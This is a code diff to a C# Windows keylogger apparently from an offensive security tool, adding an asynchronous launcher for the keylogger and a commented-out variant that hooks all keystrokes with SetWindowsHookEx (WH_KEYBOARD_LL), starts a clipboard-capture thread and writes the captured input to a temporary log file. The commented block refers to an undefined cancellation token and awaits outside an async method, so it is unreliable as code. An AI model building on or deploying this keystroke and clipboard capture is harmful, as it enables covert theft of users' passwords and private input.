@@ -7,11 +7,12 @@
     using System.Security.Principal;
     using System.Text;
     using System.Threading;
+    using System.Threading.Tasks;
     using System.Windows.Forms;
 
     public class Keyboard
     {
-        public static string logName = Helpers.CreateTempFileName(".log", "keylogger-");
+        public static string logName = Helpers.CreateTempFileName(".log", "keylogger-", "keylogger");
         public static string lastTitle = "";
         public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
 
@@ -1940,5 +1941,48 @@
                 Console.WriteLine("\n[*] Log name for last session: {0}", Keyboard.logName);
             }
         }
+
+        public static Task StartKeyloggerAsync() =>
+            Task.Factory.StartNew(() => StartKeylogger());
+        //{
+        //    Console.WriteLine("Starting keylogger...");
+
+        //    try
+        //    {
+        //        Trace.Listeners.Clear();
+        //        TextWriterTraceListener twtl = new TextWriterTraceListener(Keyboard.logName);
+        //        twtl.Name = "TextLogger";
+        //        twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
+
+        //        ConsoleTraceListener ctl = new ConsoleTraceListener(false);
+        //        ctl.TraceOutputOptions = TraceOptions.DateTime;
+
+        //        Trace.Listeners.Add(twtl);
+        //        Trace.Listeners.Add(ctl);
+        //        Trace.AutoFlush = true;
+
+        //        // Start the clipboard
+        //        ThreadStart clipboardThreadStart = new ThreadStart(BootClipboard);
+        //        Thread clipboardThread = new Thread(clipboardThreadStart);
+        //        clipboardThread.Start();
+        //        //Application.Run(new ClipboardNotification.NotificationForm());
+        //        HookProc callback = CallbackFunction;
+        //        var module = Process.GetCurrentProcess().MainModule.ModuleName;
+        //        var moduleHandle = GetModuleHandle(module);
+        //        var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
+
+        //        while (cancellationToken.IsCancellationRequested == false)
+        //        {
+        //            PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
+        //            await Task.Delay(5);
+        //        }
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        Console.WriteLine("[X] Exception: {0}", ex.Message);
+        //        Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
+        //        Console.WriteLine("\n[*] Log name for last session: {0}", Keyboard.logName);
+        //    }
+        //}
     }
 }
